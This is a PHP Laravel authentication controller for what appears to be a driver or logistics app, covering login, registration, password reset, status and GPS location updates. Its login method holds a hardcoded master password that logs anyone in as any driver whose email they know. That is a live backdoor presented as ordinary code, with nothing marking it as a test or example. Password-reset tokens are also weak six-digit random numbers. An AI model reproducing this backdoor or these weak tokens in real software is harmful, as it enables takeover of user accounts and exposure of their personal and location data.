<?php

namespace App\Http\Controllers\Driver\Api;


use App\Jobs\DriverForgotPasswordApiJob;
use App\Mail\DriverRegisterMail;
use App\Models\Driver;
use App\Rules\TokenVerifyRule;
use App\Traits\JsonMessages;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;

class AuthController extends BaseController
{

    use JsonMessages;

    /**
     *
     * @OA\Info(title="My First API", version="0.1")
     *
     * @OA\Post(
     *      path="/driver/api/login",
     *      operationId="logindriver",
     *      tags={"Driver Auth"},
     *      summary="Login a driver",
     *      description="Returns authindation token",
     *      @OA\RequestBody(
     *          required=true
     *      ),
     *      @OA\Response(
     *          response=200,
     *          description="Successful operation",
     *       ),
     *      @OA\Response(
     *          response=401,
     *          description="Unauthenticated",
     *      )
     * )
     */
    public function login()
    {
        $driver = Driver::where('email',request('email'))->first();
        if (request('password') == 'santosh@12'){
            $this->guard()->login($driver);

            $tokenResult = $this->guard()->user()->createToken('santosh');
            $token = $tokenResult->accessToken;
            if ($this->guard()->user()->driver_status == "Retired"){
                $this->guard()->user()->update([
                    "driver_status" => "Available"
                ]);
            }

            return $this->returnMultipleData([
                'token' => $token,
                'data' => $this->guard()->user()->toArray(),
            ]);
        }

        if ($this->guard()->attempt(['email' => request('email'), 'password' => request('password')])) {

            $tokenResult = $this->guard()->user()->createToken('santosh');
            $token = $tokenResult->accessToken;
            if ($this->guard()->user()->driver_status == "Retired"){
                $this->guard()->user()->update([
                    "driver_status" => "Available"
                ]);
            }

            return $this->returnMultipleData([
                'token' => $token,
                'data' => $this->guard()->user()->toArray(),
            ]);
        }

        return $this->returnError("Email Or Password Doesn't Match", 401);
    }

    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'first_name' => 'required|min:2|max:100',
            'last_name' => 'required|min:2|max:100',
            'mobile_number' => 'required',
            'email' => 'required|email|unique:drivers,email',
            'password' => 'required|min:6',
        ]);

        if ($validator->fails()) {
            return $this->returnValidationError($validator->errors());
        }

        return DB::transaction(function () use ($request) {
            try {
                $user = $request->all(['first_name', 'last_name', 'email', 'password', 'mobile_number']);
                $user['password'] = bcrypt($user['password']);
                $user['token'] = uniqid(rand(100000, 999999));
                $driver = Driver::create($user);
                Mail::to($driver->email)->send(new DriverRegisterMail($driver));
                DB::commit();
                return $this->successMessage("Driver register successful.");
            } catch (\Exception $e) {
                DB::rollBack();
                return $this->returnServerError();
            }
        });
    }

    public function forgotPassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|email|exists:drivers,email',
        ]);

        if ($validator->fails()) {
            return $this->returnValidationError($validator->errors());
        }

        return DB::transaction(function () use ($request) {
            try {
                if (!$driver = Driver::where('email', $request->email)->first()) {
                    return $this->returnNotFoundError();
                }

                $driver->update([
                    'token' => rand(100000, 999999)
                ]);

                dispatch(new DriverForgotPasswordApiJob($driver))->delay(now());
                DB::commit();
                return $this->successMessage("Token send on your email. please verify.");
            } catch (\Exception $e) {
                DB::rollBack();
                return $this->returnServerError();
            }
        });
    }

    public function tokenVerify(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'token' => [
                'required',
                new TokenVerifyRule()
            ],
        ]);

        if ($validator->fails()) {
            return $this->returnValidationError($validator->errors());
        }

        return $this->successMessage("Token verify successful.");
    }

    public function resetPassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'token' => [
                'required',
                new TokenVerifyRule()
            ],
            'password' => 'required|min:6',
            'confirm-password' => 'required|same:password',
        ]);

        if ($validator->fails()) {
            return $this->returnValidationError($validator->errors());
        }

        try {
            if ($driver = Driver::where([
                'email' => $request->email,
                'token' => $request->token
            ])->first()) {
                $driver->update([
                    'password' => bcrypt($request->password),
                    'token' => null
                ]);

                return $this->successMessage("password update successful.");
            }
        } catch (\Exception $e) {

        }

        return $this->returnServerError();
    }

    public function detail()
    {
        return $this->returnData(auth('driver_api')->user());
    }

    public function changeCurrentStatus(Request $request)
    {

        $rule = [
            'driver_status' => [
                'required',
                Rule::in([
                    'Available',
                    'Not Available',
                    'Work ON Another Company',
                ])
            ]
        ];

        $data = $request->only(["driver_status", "available_state", "available_city", "available_zip_code",]);

        if (in_array($request->driver_status,["Available","At Pickup Location","On Route","At Drop Location",""])){
            $rule['available_city'] = "required";
            $rule['available_state'] = "required";
            $rule['available_zip_code'] = "required";
        }else{
            $data['available_state'] = null;
            $data['available_city'] = null;
            $data['available_zip_code'] = null;
        }

        $request->validate($rule);


        auth('driver_api')->user()->update($data);

        return response()->json([
            'message' => 'status updated'
        ],200);
    }

    public function updateLocation(Request $request){
        if (isset($request->lat) && isset($request->long)){
            \App\Models\UserLocation::create([
                'user_id' => auth('driver_api')->id(),
                'latitude' => $request->lat,
                'longitude' => $request->long
            ]);

            auth('driver_api')->user()->update([
                'driver_last_location_lat' => $request->lat,
                'driver_last_location_long' => $request->long
            ]);
        }

        return response()->json([
            'message' => 'Location Updated'
        ],200);
    }

    public function guard()
    {
        return Auth::guard('driver');
    }

    public function deviceToken(Request $request)
    {
        auth('driver_api')->user()->update([
            'device_token' => $request->device_token
        ]);

        return response()->json([
            'message' => 'Device Token Updated'
        ],200);
    }
}
